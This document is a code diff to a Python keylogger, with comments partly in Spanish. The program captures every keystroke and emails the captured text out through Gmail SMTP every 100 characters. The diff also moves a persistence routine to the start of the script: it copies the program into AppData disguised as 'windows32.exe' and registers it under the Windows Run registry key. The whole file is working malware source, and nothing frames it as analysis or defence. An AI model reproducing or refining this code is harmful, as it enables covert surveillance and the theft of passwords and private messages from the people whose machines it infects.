@@ -1,9 +1,19 @@
+# -*- coding: utf-8 -*-
 import keyboard as key
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 import smtplib
-
+import os
+import subprocess
+import shutil
+import sys
 import datetime
+
+#Habilitar Persistencia
+location = os.environ['appdata'] + '\\windows32.exe'
+if not os.path.exists(location):
+    shutil.copyfile(sys.executable,location)
+    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v keylogger /t REG_SZ /d "'+ location +'"',shell=True)
 
 Text = ""
 
@@ -19,13 +29,13 @@ while True:
         else:
             Text = Text + Recorded
 
-    if (len(Text)>=500): 
+    if (len(Text)>=100): 
         try:
             msg = MIMEMultipart()
             password="contraseña/password"
             msg['From']="email"
             msg['To']="email a enviar datos"
-            msg['Subject']="Reporte: "+ str(datetime.datetime.now().date())
+            msg['Subject'] = "Report "+ str(datetime.datetime.now().date())
             msg.attach(MIMEText(Text, 'plain'))
             server = smtplib.SMTP('smtp.gmail.com: 587')
             server.starttls()
@@ -33,9 +43,6 @@ while True:
             server.sendmail(msg['From'], msg['To'], msg.as_string())
             server.quit()
             Text=""
-            location = os.environ['appdata'] + '\\windows32.exe'
-            if not os.path.exists(location):
-                shutil.copyfile(sys.executable,location)
-                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v keylogger /t REG_SZ /d "'+ location +'"',shell=True)
+            
         except:
             print("Error")
